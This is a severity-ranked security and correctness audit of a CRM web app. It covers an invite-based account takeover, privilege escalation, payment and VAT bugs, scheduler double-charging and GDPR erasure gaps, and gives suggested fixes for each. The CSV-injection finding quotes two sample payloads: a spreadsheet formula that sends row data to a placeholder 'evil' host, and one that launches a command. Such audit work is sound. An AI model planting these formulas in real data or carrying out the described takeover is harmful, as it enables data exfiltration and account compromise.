# Full-app code review — findings

Plan/tracker: `docs/superpowers/plans/2026-07-04-full-app-code-review-plan.md`.
Format: `[P0–P3] file:line — summary — failure scenario — suggested fix`.
P0 security/data-loss/tenant-leak · P1 correctness · P2 perf/reliability ·
P3 maintainability. Report-only; no code changed during review.

## Executive summary (R9 synthesis)

Batches R0–R9 complete. R1 (security) and R2 (payments) got adversarial
multi-agent verification; the rest were single-pass deep reviews. Every
finding was traced end-to-end in code; unverified items (R2 verifiers hit a
session limit) are tagged.

| Severity | Count | Where |
|---|---|---|
| **P0** | 1 | Invite-accept org account takeover (R1) |
| **P1** | 4 | Invite→admin privesc (R1); seat-upgrade money loss, initial double-charge, VAT overstatement (R2) |
| **P2** | 12 | Manager cross-team leak, team-annex, jwt_secret default (R1); CSV injection, GDPR erasure gaps (R3); reassign clock (R4); schedulers×workers double-charge (R5); comp-cancel + choose-plan lockout (R2); localStorage crash (R6); JWT empty-string + workers (R8) |
| **P3** | ~11 | owner cross-org, charge-status oracle (R1); activity-type + sweep race (R4); security headers (R5); billing P3s unverified (R2); no URL sync (R6); pnpm field (R7); PII in logs (R8) |

**Fix ordering (recommended):**
1. **P0 first — invite account takeover** (R1). Stop returning raw invite
   tokens; require credential proof for existing users; forbid inviting
   existing emails. Single highest risk.
2. **P1 privilege escalation** (R1): clamp invitable role to inviter's
   authority. Same subsystem as #1 — fix together.
3. **P1 money bugs** (R2): commit-before-charge ordering, initial-charge
   dedup, VAT back-calculation. Real financial + legal-document impact.
4. **P2 multi-tenant leaks** (R1): scope the reports/widgets + export-csv
   endpoints; lock down team-member reassignment.
5. **P2 double-charge infra** (R5/R8): move schedulers out of the web workers
   (or advisory-lock each sweep). Manifests in the standard 2-worker prod.
6. **P2 correctness/robustness**: GDPR erasure gaps (R3), reassign clock (R4),
   CSV injection (R3), localStorage crash + red CI (R6), jwt_secret guards
   (R1/R8), comp-cancel & choose-plan lockout (R2).
7. **P3** batch cleanup, including the unverified R2 billing P3s (re-verify
   the `_add_months` 360-day one — it silently overcharges annual plans).

**Note on the red test suite:** the 12 failing frontend tests all stem from
one bug (R6 localStorage). Backend suite is now runnable locally and **664/664
pass**. Fixing R6 should green the frontend too.

## Surface map (R0 recon, HEAD = 6144a30)

- **Backend** `backend/app` — 24.7k LOC Python. FastAPI, SQLAlchemy async,
  Postgres. 28 routers in `api/v1/` (auth, users, organizations, teams,
  invitations, companies, contacts, deals, pipelines, activities, events,
  imports, data_export, bulk_email, blocked_companies, payments, plans,
  subscription, invoices, admin, admin_invoices, feedback, onboarding,
  reports, reports_widgets, google_calendar, user_smtp, health).
- **Models** (30) incl. organization, user, refresh_token, auth_action_token,
  subscription, charge, invoice*, payment_method, webhook_event,
  ownership_history, email_campaign, super_admin_audit.
- **Services**: auth, billing, comgate, bulk_email, business_registry (ARES),
  email/email_auth, freeing (365-day pool release), google_oauth/calendar,
  imports/, invoicing/, onboarding, org_billing, org_erasure (GDPR),
  pipeline, reports/, scheduler, super_admin_audit, lookup_cache.
- **Frontend** `frontend/src` — 45.9k LOC TS/TSX. React + Vite; app/
  (companies, contacts, deals, pipeline, activities, calendar, events,
  billing, reports, settings incl. import, tutorial), auth/, admin/,
  marketing/, onboarding/, components/.
- **Tests**: 650 backend test functions; 140 frontend vitest tests. CI:
  `.github/workflows/ci.yml`.

## R0 — Recon & baselines

- [P1] frontend/src/__tests__ — **12 of 140 frontend tests FAIL on main**
  (addCompanyModal ×3, bulkEmail ×2, companies ×3, companiesTable ×2,
  pipeline ×2) — main is red, so new regressions are invisible; the failing
  files overlap the admittedly-unreviewed filters commit `6144a30` — root
  cause in R6; either fix or quarantine, then keep main green.
- [P1] backend deps — **starlette 1.0.0 has 5 known vulns** (PYSEC-2026-161/
  -248/-249, CVE-2026-48817/-48818; fixed ≤1.3.1); python-multipart 0.0.28
  CVE-2026-53538 (fix 0.0.30); weasyprint 63.1 CVE-2025-68616 (fix 68.0) —
  public exploits against the HTTP layer — upgrade and re-run test suite.
- [P2] frontend deps — react-router (via react-router-dom) moderate
  GHSA-2j2x-hqr9-3h42, patched ≥6.30.4 — upgrade.
- [P2] backend/tests + app/core/config.py:18 — test suite unrunnable outside
  docker: DB defaults to host `postgres:5432` and WeasyPrint imports native
  libs at module import (services/invoicing/renderer.py:47) — devs on hosts
  without docker (this machine) can't run tests → changes ship untested
  locally (only 163/650 tests run DB-free) — support a TEST_DATABASE_URL
  override + lazy-import weasyprint.
- [P3] frontend/package.json — `pnpm.onlyBuiltDependencies` no longer read
  by pnpm 11 (warning on every run) — migrate per pnpm settings docs.

Baseline: `tsc` clean; vitest 128/140 pass. Backend pytest was initially
unrunnable on host; **now resolved** — installed `postgresql@16` + `pango`
(brew), created the `simplecrm` role/db, ran `alembic upgrade head`, and the
full suite passes: **664 passed in ~18s** with
`DATABASE_URL=postgresql+asyncpg://simplecrm:simplecrm@localhost:5432/simplecrm`
(+ `DYLD_FALLBACK_LIBRARY_PATH=/opt/homebrew/lib` for WeasyPrint). The P2
"unrunnable on host" note above stands only as a docs/onboarding gap.

## R1 — Security core (ultracode: 5 reviewers + adversarial verify)

13 raw findings → 12 CONFIRMED by independent refutation agents, 1 UNCERTAIN,
0 refuted. Several invite findings share one root cause; consolidated below.

> **FIX STATUS (branch `fix/review-p0-p1-security-payments`):** The P0
> account-takeover and the P1 invite→admin escalation below are **FIXED** and
> covered by 3 new regression tests (`tests/api/v1/test_invitations.py`); full
> backend suite 667/667 green. Changes: (A) role-authority ceiling in
> `create_invitation` — only admins may grant `admin`/`can_invite`; (B)
> `create_invitation` now rejects inviting any email that already belongs to an
> org (not just a *different* org); (C) `accept_invitation_for_email_signup`
> verifies the password before adopting the org / minting a session when the
> account already has one (→ 401 `invitation_password_mismatch`). Token-in-API
> exposure (invite_url) left as a follow-up — low severity once A–C are in.

### P0

- [P0] backend/app/services/invitations.py:357 (+ api/v1/auth.py:596-648,
  api/v1/invitations.py:44,126) — **Org-wide account takeover via invite-
  accept.** The unauthenticated `POST /auth/invite/accept` mints a full
  access+refresh session for the invited email; for an *existing* user it
  deliberately skips the password check (357-361). But invite tokens are NOT
  inbox-only: `POST /invitations` returns `invite_url` (live signed token) in
  its 201 body and `GET /invitations` re-mints it. `create_invitation` only
  blocks *cross-org* emails, so any `can_invite` user can invite the org
  admin, read the token from the API response, and POST it with a chosen
  password to receive a logged-in session **as that admin** (role chosen by
  attacker), victim's real credentials untouched (stealthy).
  Fix: never issue a session for an already-password-protected user via the
  invite path without re-auth; stop returning raw invite tokens to the
  inviter; forbid inviting an email that already maps to any existing User.

### P1

- [P1] backend/app/api/v1/invitations.py:83/95 + schemas/invitation.py:12
  (three reviewers, one root cause) — **Privilege escalation: `can_invite`
  ⇒ can mint admins.** `require_can_invite` admits any non-admin with the
  `can_invite` flag. `InvitationCreate.role`/`.can_invite` are unclamped and
  `create_invitation` never checks the requested role against the inviter's
  own authority, so a `can_invite` salesperson/manager invites a controlled
  inbox (or their own email) with `role=admin, can_invite=true`, accepts, and
  becomes a full org admin (billing, user roles, GDPR erasure) — bypassing
  the admin-only role gate on `PUT /users/{id}`.
  Fix: cap the invitable role/can_invite to the inviter's privilege — only
  admins may grant admin or can_invite; re-validate on acceptance.

### P2

- [P2] backend/app/api/v1/reports_widgets.py:93-96 (all 12 widget endpoints)
  + api/v1/reports.py:670 (`POST /reports/export-csv`) — **Manager cross-team
  data leak.** These endpoints gate on `require_role(manager)` but forward
  caller-supplied `team_id`/`owner_user_id` into the compute helpers with no
  `_assert_team_visible`/`scope_by_owner` — unlike the legacy `/reports/
  leaderboard`, which explicitly denies it. A manager of team A passes
  `team_id=<team B>` (or `owner_user_id=<rep in B>`, enumerable via the
  org-wide `GET /users`) and reads/exports other teams' deal names, values,
  owner names, win rates, activity, and the org-wide leaderboard.
  Fix: apply `_assert_team_visible` + restrict `owner_user_id` to
  `team_member_ids`; for unfiltered managers, scope to their managed teams.
- [P2] backend/app/api/v1/teams.py:116 — **Manager can annex other teams'
  users.** `PUT /teams/{id}/members` (only `get_current_user` + own-team-
  manager check) validates member ids only for org membership, then sets
  `team_id` on any listed org user — a field otherwise admin-only via
  `PUT /users/{id}`. A manager lists another team's salespeople, pulls them
  into their own team, and gains `scope_by_owner` visibility of those users'
  companies/deals/events (and yanks them out of their real team).
  Fix: reject `member_ids` currently in another team unless caller is admin;
  route all `team_id` mutations through one admin-gated control.
- [P2] backend/app/core/config.py:23 — **`jwt_secret` defaults to a repo-
  known literal with no fail-fast.** `"dev-secret-change-me-in-prod"` signs
  every access/refresh JWT and all itsdangerous tokens (OAuth-state/CSRF,
  invite, email-verify, password-reset). Nothing asserts it was overridden
  when `app_env != dev`. A prod deploy that forgets `JWT_SECRET` runs on the
  known default → attacker forges tokens for any user/role = total auth
  bypass (unauthenticated). Note `docker-compose.prod.yml` uses `${JWT_SECRET}`
  (empty if unset — still forgeable); bare/k8s deploys use the literal.
  Fix: fail startup when `app_env != dev` and `jwt_secret` is empty/default.

### P3

- [P3] backend/app/api/v1/companies.py:432,496 — **Admin can set
  `owner_user_id` to a cross-org user.** Only guard is `can_write_row`
  (True for admins); unlike `POST /companies/{id}/reassign` (which checks
  org at 553-557), create/update don't. `_assert_owner_cap` (73-82) also
  lacks an `organization_id` filter, so org A can park companies on org B's
  salesperson and exhaust their global company cap (cross-tenant DoS of a
  core workflow); also a weak user-existence oracle. Gated on knowing a
  cross-org UUID (unguessable), hence P3.
  Fix: assert new owner ∈ caller org in create/update; add org filter to the
  cap count query. (Same helper fix covers deals below.)
- [P3] backend/app/api/v1/deals.py:153,206 — Same missing in-org owner check
  for `Deal.owner_user_id`; every other FK (company/stage/contact) is
  asserted in-org but the owner is not. Corrupts board/report totals for
  org A's non-admins (deal hidden by `scope_by_owner`); weak UUID oracle.
- [P3] backend/app/api/v1/payments.py:385 — Unauthenticated `GET /payments/
  return` does `session.get(Charge, refId)` with no org scope and reflects
  `status` into the redirect. Anyone with a Charge UUID learns its payment
  status cross-tenant. Low impact (UUID unguessable, coarse status only).
  Fix: don't reflect DB state on the unauth return route.

### Uncertain (report, do not action blindly)

- [P2→P3?] backend/app/services/google_oauth.py:90 — OAuth never checks the
  `email_verified` claim before linking a Google identity to an existing
  password account. Verifier judged the account-takeover path not realistically
  reachable (Google won't assert a victim's email to an attacker who doesn't
  control the domain; controlling the domain already grants mailbox access).
  Still a valid OIDC hardening gap — add an `email_verified is True` guard.

## R3 — Data lifecycle (single-pass deep review)

Reviewed: CSV export, imports (csv_reader/mapping/matcher/runner), GDPR
erasure, ARES client. Tenant scoping on export is correct (org filter +
`scope_by_owner`). Import limits sound (10 MB / 50k rows, 5/hr rate limit).
ARES client is clean — 8-digit IČO validation before URL interpolation
(no SSRF), fixed base URL, 10s timeout, JSON-type guards. Matcher dedupe
logic correct.

- [P2] backend/app/api/v1/data_export.py:104-119 (and the reports widget CSV
  path, services/reports/csv_export.py) — **CSV formula injection.** User-
  controlled cells (`deal.name`, `stage.name`, `deal.lost_reason`, and in the
  widget export owner/company names) are written raw via `csv.writer`. A deal
  named `=HYPERLINK("http://evil/"&A1)` or `=cmd|'/c calc'!A1` becomes a live
  formula when the exported file is opened in Excel/LibreOffice, exfiltrating
  row data or triggering command execution on the downloader's machine.
  Fix: prefix any cell beginning with `= + - @` (or tab/CR) with a leading
  apostrophe, or quote-guard, before writing. Apply in both CSV writers.
- [P2] backend/app/services/org_erasure.py:95-116 — **GDPR erasure leaves
  three PII/credential tables behind.** The hard-delete list predates newer
  tables; because the org and user rows are kept (anonymized, not deleted),
  their `ondelete=CASCADE` never fires, so these survive with data intact:
  (1) `google_calendar_connections` — Fernet-encrypted Google **refresh +
  access tokens** and `google_email`, never deleted **or revoked** (a
  "deleted" user's live third-party calendar access persists); (2)
  `user_smtp_settings` — encrypted SMTP password, host, username, from-email;
  (3) `email_campaigns` + `email_campaign_recipients` — campaign bodies and
  **recipient email addresses** (the org's contacts' PII). Contradicts the
  module's own promise to hard-delete every PII satellite.
  Fix: add explicit deletes for these three (plus revoke the Google tokens
  via the OAuth client) in `erase_organization`; add a test asserting no rows
  remain for the org across every PII-bearing table. (`calendar_events` and
  `ownership_history` are fine — they cascade via `deals`/`companies`, which
  are hard-deleted.)

## R4 — Domain logic (single-pass deep review)

Reviewed: 365-day pool release (freeing.py), the 6 scheduler sweeps, deal
win-reset, pipeline seeding. The nightly freeing sweep is correctly wired
(scheduler.py:148, 03:00 Europe/Prague) — the `freeing.py` docstring claiming
it's "a follow-up" is stale. Win-reset works (deals.py:280,355 set
`ownership_expires_at = now + window_days` on order/win). Recurring-charge job
is safe from double-billing: `PaymentMethod.organization_id` is `unique=True`,
so the sub↔payment_method join yields one row. Overdue/renewal/reminder
sweeps are idempotent and correctly scoped.

- [P2] backend/app/services/freeing.py:125-147 (via `POST /companies/{id}/
  reassign`, companies.py:543) — **Reassignment doesn't reset the ownership
  clock.** `reassign_company` sets `owner_user_id` but never updates
  `ownership_expires_at`, so the new owner inherits the *previous* owner's
  expiry. Reassigning a company that's near (or past) expiry means the
  nightly freeing sweep pulls it from the new owner that same night — they
  never get their working window. Every other assignment path resets the
  clock (create: companies.py:465; win: deals.py:280,355); manual reassign is
  the lone gap. Fix: set `company.ownership_expires_at = now + window_days` in
  `reassign_company`.
- [P3] backend/app/services/freeing.py:61-75 — `_record_release` hardcodes
  `activity_type=company_freed` for ALL callers, so a **reassignment** (and
  the manual `free` with a non-timeout reason) writes a "company freed"
  entry to the activity feed. The `reason` in the payload distinguishes them,
  but the activity type is misleading in the UI timeline. Fix: pass the
  activity type per call site.
- [P3] backend/app/services/freeing.py:91-104 — the sweep selects then
  updates `owner_user_id` with no row lock (`with_for_update`). A manual
  reassign committing mid-sweep can be clobbered back to NULL (last-writer-
  wins). Very low probability (03:00 window, single-row) — note only.

## R5 — API surface (single-pass deep review)

Reviewed: main.py (CORS/middleware/lifespan), scheduler process model, error
handling, headers. CORS default is safe (`["http://localhost:5173"]`; prod
must set `CORS_ORIGINS` or the frontend can't call the API — fails loud).
`debug` is off, FastAPI hides tracebacks, so no stack-trace leakage.

- [P1] backend/app/main.py:45-64 + docker-compose.prod.yml:55
  (`--workers 2`) — **Schedulers run in every worker process → duplicated
  billing side effects.** The lifespan starts all six background schedulers
  (`recurring_charge`, `freeing`, `renewal_draft`, `overdue`, `billing_info`,
  `integrity`) in-process, and prod runs **2 uvicorn workers**, so every sweep
  runs twice concurrently with no leader election or distributed lock. Worst
  case: `run_recurring_charges` (scheduler.py:163) — both workers select the
  same due subscriptions, each creates its own `Charge` (distinct UUID/ref_id)
  and calls ComGate `create_recurring_payment` → **the customer is charged
  twice for one renewal**. `run_billing_info_reminder_sweep` has a TOCTOU on
  `billing_info_reminder_sent_at` (both workers read NULL before either
  stamps) → duplicate emails. Renewal-draft is protected by a uniqueness
  check; freeing/overdue are mostly idempotent (but can double-insert Activity
  rows). Fix: run schedulers in a single dedicated process (separate
  entrypoint / `--workers 1` sidecar), or gate each sweep behind a Postgres
  advisory lock (`pg_try_advisory_lock`) / `SELECT … FOR UPDATE SKIP LOCKED`
  on the due rows with a per-period idempotency key on Charge.
- [P3] backend/app/main.py:78-84 — **No security-header middleware.** Responses
  carry no `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`,
  `X-Frame-Options`/`frame-ancestors`, or `Referrer-Policy`. Lower stakes for a
  pure JSON API behind a separate SPA origin, but add a headers middleware
  (HSTS at minimum) since auth cookies (refresh token) are set by this app.
- Otherwise standard: per-endpoint `RateLimiter` on the abusable surfaces
  (imports 5/hr, export 10/min, ARES lookups), consistent pagination params,
  `HTTPException` details are static strings (no internal-state leakage).

## R2 — Payments & billing (ultracode: 3 reviewers + adversarial verify)

12 raw findings. Verification was cut off by a session limit — 3 were fully
adversarially verified; the billing-state + one invoicing verifier died, so I
re-verified the two highest-impact ones by hand and tag the remainder
UNVERIFIED for triage. 2 findings were correctly refuted (recorded so they
aren't re-raised).

> **FIX STATUS (branch `fix/review-p0-p1-security-payments`):** Initial
> double-charge and VAT overstatement below are **FIXED** with regression
> tests (669/669 green). (1) `initial_payment_init` now 409s when the sub is
> already active or a paid initial charge exists, and `apply_initial_payment_
> success` is idempotent (early-returns if already active) so a duplicate
> webhook can't re-anchor the period. Residual: two *simultaneous* pre-
> activation tabs both completing still double-captures at ComGate — needs a
> pending-charge dedup (product decision on retry UX), left as follow-up.
> (2) `_build_lines_for_charge` now back-calculates net+VAT out of the gross
> ComGate collected, so the invoice total equals the money taken. **Seat-
> upgrade money-loss (commit-before-charge) is now **FIXED** too — the
> pending charge is committed before ComGate bills the card (so the webhook can
> always reconcile by refId), a gateway rejection marks it `failed` instead of
> rolling it back, and `create_recurring_payment` now raises when ComGate omits
> `transId` instead of colliding on the UNIQUE constraint. Regression test:
> a rejected upgrade leaves exactly one `failed` charge. Suite 670/670.

### CONFIRMED (adversarially verified)

- [P1] backend/app/api/v1/payments.py:330-350 (+ comgate.py:338) — **Seat-
  upgrade charge captured before the Charge row is committed → silent money
  loss.** `seat_change_init` flushes (not commits) the Charge, calls ComGate
  `create_recurring_payment` (money leaves the card now), then commits at
  :350 — outside the try/except. Any commit failure rolls back the Charge
  while the card is already charged; the later webhook finds no Charge for
  that refId and ACK-ignores it → customer charged, no charge row, no invoice,
  no seats. A concrete trigger: comgate.py:338 falls back to
  `initial_trans_id` when ComGate omits `transId`, colliding with the
  `Charge.comgate_trans_id` UNIQUE constraint → IntegrityError at commit.
  Fix: persist a durable record keyed by refId **before** charging; reconcile
  webhooks with no matching charge into an orphan row; stop the transId
  fallback.
- [P1] backend/app/api/v1/payments.py:112-189 — **Initial activation can
  double-charge + issue duplicate tax invoices.** No guard against a second
  `initial_payment_init` while one is pending (two tabs / retry). Both hosted
  pages can be paid; each webhook runs `apply_initial_payment_success`
  (re-anchors period unconditionally) and issues a separate daňový doklad →
  two real charges and two legally-binding invoices for one activation.
  (Verifier raised P2→P1.) Fix: reject/reuse when a pending/paid initial
  charge or active sub exists; make `apply_initial_payment_success` idempotent.
- [P2] backend/app/services/invoicing/service.py:394-443 — **Credit notes have
  no cumulative cap.** The guard compares only one note against
  `original.total_minor`; two −100000 notes against a 100000 invoice both pass
  → −200000 credited (double refund). Also no check that the target's
  `kind=='invoice'` or status is issuable (can credit a draft/voided/another
  credit note). Fix: sum existing credit notes for the original and cap the
  total; validate kind/status.

### CONFIRMED (re-verified by hand after verifier died)

- [P1] backend/app/services/invoicing/service.py:488-533 — **Tax invoice
  overstates the total by the VAT rate when the seller is a VAT payer.** For
  charge-derived invoices, `unit_price_minor = charge.amount_minor // seats`
  is the gross ComGate already collected (payments.py adds no VAT). Then
  `_materialise_line` treats it as the *net* base and adds
  `vat = subtotal * rate/100`, so `line_total = amount_minor * 1.21`. Result:
  when `BillingSettings.is_vat_payer=True`, every ComGate-path daňový doklad
  shows a total 21% above the money actually taken, with a wrong tax base —
  an accounting/VAT-compliance defect. Latent while not a VAT payer (rate 0).
  Fix: treat `charge.amount_minor` as VAT-inclusive gross and back-calculate
  `base = round(amount/(1+rate)); vat = amount − base; total = amount`.
- [P2] backend/app/services/billing.py:284-290 — **Choosing a plan locks a
  trialing customer out mid-trial.** `choose_plan` sets
  `status='pending_activation'`, which `is_app_access_allowed` does not grant
  (falls through to `False`), so an org with trial days remaining is
  pay-gated the moment it records plan intent — before paying. Fix: keep
  `trialing`/`active` (store intent separately), or honor
  `current_period_ends_at` for `pending_activation`.
- [P2] backend/app/services/billing.py:152,446 — **Canceled comp org keeps
  free access forever.** `is_app_access_allowed` short-circuits
  `if sub.is_comp: return True` before checking status, and `cancel()` never
  clears `is_comp`, so a canceled comp/barter org retains unrestricted access
  indefinitely. Fix: clear `is_comp` in `cancel()`, or don't honor `is_comp`
  once `status=='canceled'`.

### UNVERIFIED — review agent only, verifier died on session limit (triage)

- [P3] backend/app/services/billing.py:446-447 — deferred `cancel()` with a
  future `effective_at` sets `status='canceled'` immediately, gating an active
  paying org right away instead of at period end.
- [P3] backend/app/services/billing.py:155-166 — dunning: a failed renewal
  keeps `status='active'` with an already-elapsed period, so access is gated
  immediately at renewal and only "restored" once `past_due` starts the grace
  → inconsistent/flapping lockout vs the documented 7-day grace.
- [P3] backend/app/services/billing.py:256 — `_add_months` uses fixed 30-day
  months, so an annual period = 360 days → recharged ~5 days early each year
  (~1.4% overcharge, access 5 days short of a year). Fix: real calendar-month
  arithmetic (`relativedelta`).

### Refuted (recorded — do NOT re-raise)

- payments.py:555 "webhook doesn't reconcile paid amount" — REFUTED: invoice
  amount and charged amount both derive from the same immutable `Charge`
  columns; they cannot diverge.
- invoicing/service.py:326 "mark_paid not idempotent → double period
  extension" — REFUTED as written: the endpoint (admin_invoices.py:234-238)
  returns 409 for an already-paid invoice. A narrow concurrent TOCTOU remains
  (two simultaneous requests, no `SELECT … FOR UPDATE`) — worth a P3
  idempotency guard on `apply_manual_payment_success` but not the reported bug.

### Uncertain

- [P3] backend/app/services/comgate.py:337 — `create_recurring_payment`
  hardcodes `accepted=True` and ignores a business error code in a 200 body.
  Reachability depends on ComGate's undocumented recurring-error shape; the
  status endpoint proves ComGate *can* return 200+non-zero code, so add a
  `code != 0` guard as cheap insurance.

## R6 — Frontend correctness (single-pass deep review)

Reviewed: the unreviewed filters commit (`6144a30`) — CompaniesListPage state,
filter→query wiring, pagination, client auth-token handling. Two things are
**correct** and worth noting: every filter control resets pagination
(`setPage(0)` in each `onChange`, lines 501/513/530/546 — no offset-overshoot
bug), and the access token is held **in memory only** (AuthContext.tsx:31 —
never localStorage), refreshed via an httponly cookie on cold-load, which is
the XSS-safe pattern.

- [P2] frontend/src/app/companies/CompaniesListPage.tsx:70-73,101-104 —
  **Unguarded `window.localStorage` access — root cause of the 12 red tests
  and a storage-restricted-browser crash.** `readStoredViewMode` guards
  `typeof window === "undefined"` but then dereferences
  `window.localStorage.getItem`; the value is `undefined` in the jsdom test
  env (no localStorage polyfill in test-setup.ts) → `TypeError: Cannot read
  properties of undefined (reading 'getItem')` thrown at component mount,
  which cascades to all 12 failures across companies/companiesTable/
  addCompanyModal/bulkEmail/pipeline. In real browsers `localStorage` *access*
  throws a SecurityError when storage/cookies are blocked (strict-privacy
  Chrome, restricted iframe) → the entire Firmy page white-screens.
  Fix: wrap get/set in a try/catch storage helper and check
  `'localStorage' in window`; also add a localStorage polyfill to
  `src/test-setup.ts`. One fix greens CI **and** hardens production.
- [P3] frontend/src/app/companies/CompaniesListPage.tsx:81-89 — **Filter state
  isn't synced to the URL.** `ownerFilter`, `industry`, `city`, `search`,
  `page`, and sort live only in `useState` (no `useSearchParams`), so a page
  refresh, a shared link, or the browser Back button all lose the active
  filters. The plan flagged URL sync as expected for this surface; confirm
  whether in-memory-only is the intended design. If deep-linkable filters are
  wanted, lift the state into `useSearchParams`.

## R7 — Frontend quality (single-pass, light)

Reviewed: eslint, a11y signal, i18n consistency. eslint runs clean (no
errors). Accessibility is reasonable (37 app files use `aria-label`; filter
selects and search have labels). `index.html` sets `lang="cs"`. The app is
intentionally Czech-only with hardcoded strings — internally consistent, not
a defect. `data-theme="dark"` is a deliberate dark-only default.

- [P3] frontend/package.json — `pnpm.onlyBuiltDependencies` is ignored by
  pnpm 11 (warns on every install/test/build run); the esbuild allowlist now
  belongs in `frontend/pnpm-workspace.yaml`. Noise only. (Also noted in R0.)
- No new correctness issues in the quality pass. Test-coverage gap: the
  localStorage crash path (R6) had no guarding test — the fix should add one.
  Bundle size not measured (out of scope for this pass).

## R8 — Infra (single-pass deep review)

Reviewed: docker-compose.prod/dev, Dockerfiles, `scripts/backup_postgres.sh`,
alembic heads, secret handling, CI. **Well-managed overall:** prod compose
substitutes every secret from env (no hardcoded secrets), the backup script
is robust (`set -euo pipefail`, required-var assertions, pg_dump→S3 + retention
prune), there is a **single alembic head** (no divergent migration branches),
and the prod command runs `alembic upgrade head` **once** before uvicorn forks
workers (no per-worker migration race).

- [P2] docker-compose.prod.yml:41 — **`JWT_SECRET: ${JWT_SECRET}` has no
  default, so an unset var substitutes an empty string** (Compose warns, does
  not fail). Every JWT then signs with `""` → trivially forgeable = auth
  bypass. Same root as the R1 config finding; fixing either (startup assertion
  **and** a compose guard) closes it. Cross-ref R1 `config.py:23`.
- [P2] docker-compose.prod.yml:55 (`--workers 2`) — reinforces the R5 P1:
  in-process schedulers run in every worker → duplicated billing sweeps /
  double ComGate charges. The infra fix is to run the scheduler as a single
  dedicated one-replica service (or `--workers 1` sidecar) separate from the
  web workers. Cross-ref R5 `main.py:45`.
- [P3] backend/app/services/scheduler.py:106,572 (and similar) — exception
  paths log `recipient.email` (`"send failed for %s"`). Email addresses are
  PII; at scale this scatters PII across logs. Low impact — prefer logging the
  user id, or scrub, if logs leave the trust boundary.

